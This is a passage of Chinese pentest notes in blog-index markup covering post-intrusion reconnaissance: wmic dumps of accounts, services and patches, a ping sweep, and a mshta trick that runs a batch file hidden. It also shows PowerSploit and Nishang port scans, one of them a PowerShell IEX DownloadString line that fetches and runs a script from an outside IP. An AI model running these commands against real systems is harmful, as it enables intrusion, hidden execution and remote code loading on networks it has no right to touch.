title="自动收集脚本"></a>自动收集脚本</h4><h3 id="bat脚本"><a href="#bat脚本" class="headerlink" title="bat脚本"></a>bat脚本</h3><p>查一些信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>f &quot;delims=&quot; <span class="operator">%</span><span class="operator">%</span>A <span class="keyword">in</span> (<span class="string">&#x27;dir /s /b %WINDIR%\system32\*htable.xsl&#x27;</span>) do <span class="keyword">set</span> &quot;var=%%A&quot; </span><br><span class="line">wmic process <span class="keyword">get</span> CSName,Description,ExecutablePath,ProcessId <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic service <span class="keyword">get</span> Caption,Name,PathName,ServiceType,Started,StartMode,StartName <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic USERACCOUNT list <span class="keyword">full</span> <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic <span class="keyword">group</span> list <span class="keyword">full</span> <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic nicconfig <span class="keyword">where</span> IPEnabled<span class="operator">=</span><span class="string">&#x27;true&#x27;</span> <span class="keyword">get</span> Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic volume <span class="keyword">get</span> Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic netuse list <span class="keyword">full</span> <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic qfe <span class="keyword">get</span> Caption,Description,HotFixID,InstalledOn <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic startup <span class="keyword">get</span> Caption,Command,Location,<span class="keyword">User</span> <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic PRODUCT <span class="keyword">get</span> Description,InstallDate,InstallLocation,PackageCache,Vendor,Version <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic os <span class="keyword">get</span> name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic Timezone <span class="keyword">get</span> DaylightName,Description,StandardName <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html</span><br></pre></td></tr></table></figure><p>查本机IP范围内可连的IP</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>L <span class="operator">%</span>I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) DO <span class="variable">@ping</span> <span class="operator">-</span>w <span class="number">1</span> <span class="operator">-</span>n <span class="number">1</span> <span class="number">192.168</span><span class="number">.45</span>.<span class="operator">%</span>I <span class="operator">|</span> findstr &quot;TTL=&quot;   <span class="operator">/</span><span class="operator">/</span>中间的(<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>)，第一个是开头，<span class="number">254</span>是结尾。中间的<span class="number">1</span>是步长，可为负</span><br></pre></td></tr></table></figure><p>Tips:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo off <span class="operator">/</span><span class="operator">/</span>将后面多余的输出删去，不显示命令本身，不用一段一隔</span><br><span class="line">echo <span class="keyword">on</span> <span class="operator">/</span><span class="operator">/</span>一段一隔</span><br><span class="line">pause <span class="operator">/</span><span class="operator">/</span>暂停，卡扣</span><br><span class="line"><span class="variable">@echo</span> off <span class="operator">/</span><span class="operator">/</span>将第一行的命令输出也删掉</span><br><span class="line"><span class="keyword">call</span> C:\<span class="number">2.</span>bat  <span class="operator">/</span><span class="operator">/</span>调用(运行并回显)C盘下面<span class="number">2.</span>bat的内容</span><br><span class="line">cmd命令后台运行</span><br><span class="line"><span class="variable">@echo</span> off</span><br><span class="line">if &quot;%1&quot; <span class="operator">=</span><span class="operator">=</span> &quot;h&quot; goto <span class="keyword">begin</span></span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~nx0&quot;&quot; h&quot;,<span class="number">0</span>)(window.close)<span class="operator">&amp;&amp;</span>exit</span><br><span class="line">:<span class="keyword">begin</span></span><br><span class="line">REM</span><br></pre></td></tr></table></figure><p>工具kscan会好用一点</p><p>fscan -t 192.168.45.0&#x2F;24 –encoding gbk</p><p>暂时无法在飞书文档外展示此内容</p><p>另外端口扫描就是powersploit和redteamtool</p><p>powersploit</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上传到靶机执行</span><br><span class="line">powershell ‐<span class="keyword">exec</span> bypass Import‐<span class="keyword">Module</span> .\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts <span class="number">192.168</span><span class="number">.41</span><span class="number">.0</span><span class="operator">/</span><span class="number">24</span> ‐T <span class="number">4</span> ‐ports <span class="string">&#x27;445,8080,3389,80&#x27;</span> ‐oA c:\<span class="number">1.</span>txt</span><br><span class="line"></span><br><span class="line">远程执行</span><br><span class="line">powershell ‐<span class="keyword">exec</span> bypass ‐c IEX (<span class="keyword">New</span>‐ObjectSystem.Net.Webclient).DownloadString(<span class="string">&#x27;http://118.178.134.226:8080/Invoke‐Portscan.ps1&#x27;</span>);import‐<span class="keyword">module</span> .\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts <span class="number">192.168</span><span class="number">.41</span><span class="number">.0</span><span class="operator">/</span><span class="number">24</span> ‐T <span class="number">4</span> ‐ports <span class="string">&#x27;445,8080,3389,80&#x27;</span> ‐oA c:\<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><p>Nishang</p><p>针对powershell的渗透工具，</p><p>类似的Invoke‐Portscan.ps1;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="operator">-</span>command &quot;&amp;&#123;Invoke-PortScan -StartAdress 192.168.41.1 -EndAddress 192.168.41.21 -ResolveHost&#125;&quot;</span><br><span class="line">powershell ‐command &quot;&amp; &#123; import‐module .\nishang\nishang.psm1; Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.255 -Ports 445 ‐ResolveHost &#125;&quot; </span><br></pre></td></tr></table></figure><p>可以先导入模块在cs中，powershell-import +模块位置</p><p>然后直接使用就行</p>]]></content>
      
      
      
        <tags>
            
            <tag> caosuan </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
